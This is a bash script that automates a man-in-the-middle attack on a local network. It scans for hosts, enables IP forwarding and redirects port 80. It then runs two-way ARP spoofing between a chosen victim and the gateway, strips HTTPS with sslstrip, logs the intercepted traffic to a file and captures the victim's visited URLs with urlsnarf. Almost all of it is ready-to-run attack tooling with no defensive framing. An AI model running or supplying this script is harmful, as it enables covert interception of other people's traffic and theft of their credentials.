#!/bin/bash

#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
default="\e[0m"

# Design
function top(){
	clear
	sleep 0.1 && echo -e "$blue "
 		sleep 0.1 && echo -e "	 ___  _____   _____ _ __  "
		sleep 0.1 && echo -e "	/ __|/ _ \ \ / / _ \ |_ \ "
		sleep 0.1 && echo -e "	\__ \  __/\ V /  __/ | | |"
		sleep 0.1 && echo -e "	|___/\___| \_/ \___|_| |_|"
                         
        sleep 0.1 && echo -e "$default"
	echo
	echo
}

top

if [[ $EUID -ne 0 ]]; then
        echo -e $red"[*] You do not have admin privilegies, execute the script as root!!!"$default""
        exit 1
fi

# Windows and Resolution
function autoResolution {
	nx=4
	detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
	echo -ne $blue"[+] Screen Resolution ->"$default
	echo -e $detectedresolution
	screenwidth=${detectedresolution%x*}
	screenheight=${detectedresolution#*x}
	screenwidth=$(($screenwidth/(($nx*3))-8))
	screenheight=$(($screenheight/(($nx*5))-14))
	resolution="${screenwidth}x${screenheight}"
	TOPLEFT="-geometry $resolution+0+0"
	TOPRIGHT="-geometry $resolution-0+0"
	BOTTOMLEFT="-geometry $resolution+0-0"
	BOTTOMRIGHT="-geometry $resolution-0-0"
	MIDDLELEFT="-geometry  100x14+0+$screenheight"
	MIDDLERIGHT="-geometry 100x14-0+$screenheight"
}
autoResolution

echo -ne $red"[+] Getting Router IP address->"
gw=$(sudo ip route | awk '{print $3}' | head -1)
echo -e $blue"$gw"$default


#find active inteface
echo -ne $red"[+] Finding Active Interfaces->"
ifs=()
ifw=$(iw dev | grep -i "interface" | awk '{print $2}')
#ife=$(ip addr | awk '/state UP/ {print $2}')
ife=$(ifconfig | grep BROADCAST | awk '{print $1}' | sed 's/.$//')
ifs+=( "$ifw" )
ifs+=( "$ife" )
if [[ ${ifs[@]} ]]; then
	for i in ${ifs[@]}
	do 
		status=$(sudo ethtool $i | grep -i "link detected" | awk '{print $3 }')
		if [ $status = "yes" ] ; then
			int=$i
		fi
	done
	echo -e $blue"$int"$default
else
	exit 1
fi

echo -ne $red"[+] Getting Local IP address->"
localip=$(ifconfig $int | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
echo -e $blue"$localip"$default

echo -e $red"[+] Preparing Attack!!!"
declare -a ips=()
ips=($(sudo nmap -sP $gw/28 | grep -i 'report' | awk '{print $5}'))
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
echo -e $blue"Done..."$default

index=0
echo
for i in ${ips[@]}
do
  echo -e $blue$index.$default $red$i$default
  index=$[index+1]
done
echo -e
read -p "[*] Choose IP:" input
echo
# arpspoof
echo -ne $red"[+] Starting arpspoof..."
xterm $TOPLEFT -T ARPSPOOF@${ips[$input]} -e arpspoof -i $int -t ${ips[$input]} -r $gw &
xterm $TOPLEFT -T ARPSPOOF@$gw -e arpspoof -i $int -t $gw -r ${ips[$input]} &
sleep 3
echo -e $blue"Done!!!"$default
# sslstrip
echo -ne $red"[+] Starting sslstrip..."
xterm $TOPRIGHT -T SSLSTRIP -e sslstrip -w sslstrip.log -l 8080 &
sleep 3
echo -e $blue"Done!!!"$default
# sslstrip monitor
echo -ne $red"[+] Starting sslstrip monitor..."
xterm $BOTTOMLEFT -T MONITOR -e tail -f sslstrip.log &
sleep 3
echo -e $blue"Done!!!"$default
# Driftnet
#echo -ne $red"[+] Starting driftnet..."
#mkdir -p "driftnetdata"
#xterm $MIDDLERIGHT -T DRIFTNETDATA -e driftnet -i $int -p -d driftnetdata &
#sleep 3
#echo -e $blue"Done!!!"$default
# urlsnarf
echo -ne $red"[+] Starting urlsnarf..."
xterm $MIDDLERIGHT -T URLSNARF -e urlsnarf -i $int &
sleep 3
echo -e $blue"Done!!!"$default

while true; do
	echo -ne $yellow"[*] Do you want to finish? "$default
	read WISH

	if [ $WISH = "y" ]; then
		sudo killall xterm
		sudo echo "0" > /proc/sys/net/ipv4/ip_forward
		sudo iptables --flush
		sudo iptables --table nat --flush
		sudo iptables --delete-chain
		sudo iptables --table nat --delete-chain
		echo -e $red"[+] Clean up successful..."
		echo -e $red"[+] Thank you for using MITM, Good Bye..."
		exit
	fi
done
exit
